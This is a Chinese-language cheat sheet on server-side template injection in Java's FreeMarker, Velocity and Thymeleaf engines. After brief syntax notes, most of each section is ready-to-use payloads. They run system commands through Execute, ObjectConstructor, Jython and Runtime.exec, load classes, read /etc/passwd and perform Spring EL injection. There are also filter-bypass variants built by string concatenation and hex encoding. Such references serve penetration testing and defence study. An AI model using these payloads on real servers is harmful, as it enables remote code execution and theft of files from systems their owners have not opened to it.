# 模板注入总结
## 模板注入
模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，其本质是将模板文件和数据通过模板引擎生成最终的HTML代码
如果攻击者可以控制呈现的模板，服务端接受了恶意输入的请求后，未经任何处理就将其作为web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，那么就会产生模板注入类的问题，对服务器产生危害

## Java FreeMarker模板
### 语法
主要有四部分组成：
- 文本，直接输出的部分
- 注释，即<#--comment-->格式不会输出
- 插值(Interpolation)：即${..}或者#{..}格式的部分，将使用数据模型中的部分替代输出
- FTL指令：FreeMarker指令，和HTML标记类似，名字前加#予以区分，不会输出。
```html
<html>
<body>
<#-- 注释部分 -->
<br>
<#-- 下面使用插值 -->
<h1>Welcome ${user} !</h1>
<p>We have these animals:</p>
    <u1>
        <#-- 使用FTL指令 -->
        <#list animals as being>
        　　<li>${being}</li>
        </#list>
    </u1>
</body>
</html>
```

### 利用
new函数，可以创建一个继承自freemarker.template.TemplateModel类的实例，实例化可用的对象来执行命令
```java
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}

<#-- 需要依赖jython.jar -->
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```

api函数，可以访问底层Java Api Freemarker的BeanWrappers，这个内置函数默认不开启，可以通过Configurable.setAPIBuiltinEnabled开启

通过getClassLoader获取类加载器，加载恶意类
```java
<#assign classLoader=object?api.class.getClassLoader()>
${classLoader.loadClass("Evil.class")}
```

任意代码执行
```java
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("ClassExposingGSON")>
<#assign field=clazz?api.getField("GSON")>
<#assign gson=field?api.get(null)>
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))>
${ex("calc")}}
```

getResource读取系统任意文件
```java
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

### 绕过
字符串拼接，十六进制编码
```java
<#assign value=("freemarker.templa"+"te.utility.Execute")?new()>${value("ca"+"l\x0063.exe")}
```

## Java Velocity模板
### 语法
- "#"用来标识Velocity的关键字，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等
- "\$"用来标识Velocity的变量；如：\$i、\$msg、$TagUtil.options(...)等。
- "{}"用来明确标识Velocity变量；比如在页面中，页面中有一个\$someonename，此时，Velocity将把someonename作为变量名，若我们程序是想在someone这个变量的后面紧接着显示name字符，则上面的标签应该改成${someone}name。
- "!"用来强制把不存在的变量显示为空白。如：当找不到username的时候，\$username返回字符串"\$username"，而\$!username返回空字符串""

### 利用
无回显执行命令
```java
#set ($exp="")
$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
```

有回显命令执行
```java
#set($engine="")
#set($str=$engine.getClass().forName("java.lang.String"))
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami"))
$proc.waitFor()
#set($out=$proc.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### 绕过
字符串拼接
```java
#set ($exp="")
#set ($run="java.lang.Run"+"time")
$exp.getClass().forName(${run}).getRuntime().exec("calc")
```

## Jave Thymeleaf模板
### 语法
- ${...}：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行
- *{...}：选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。
- #{...}：Message (i18n) 表达式 —— 允许从外部源（比如.properties文件）检索特定于语言环境的消息
- @{...}：链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL/路径（URL重写）。
- ~{...}：片段表达式 —— Thymeleaf 3.x 版本新增的内容，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等

### 利用
Thymeleaf 不允许动态生成模板（所有模板都必须提前创建）。因此，常见的模板注入利用方式不适用于 Thymeleaf。但是，Thymeleaf 仍有一些特性可被利用

当控制器直接通过模版名返回页面时
```java
@Controller
public class ThymeleafController {
    @GetMapping("/path")
    public String path(@RequestParam String lang) {
        return  lang ; //template path is tainted
    }
}
```
Thymeleaf会判断该模板名是否包含"::"字符串，并且该字符串后面有内容，然后会进行正则匹配，如果匹配到了__.*__这种模式，就取出__xx__前面部分和xx那部分，最后对xx进行表达式解析（默认为Spring EL），如果能控制作为返回值的模板名，通过构造表达式注入，就能造成命令执行
```java
//PoC
__${T(java.lang.Runtime).getRuntime().exec("calc")}__::ICSL
```

### 绕过
在3.0.12版本中修复了该漏洞

## 总结
本文主要总结了Java常见模板的注入及绕过，绕过方式还可参考表达式注入，对于支持多语句输入的模板，还可根据Java语法，通过其他类方法，如字符串反转、字符串编码解析等进行绕过
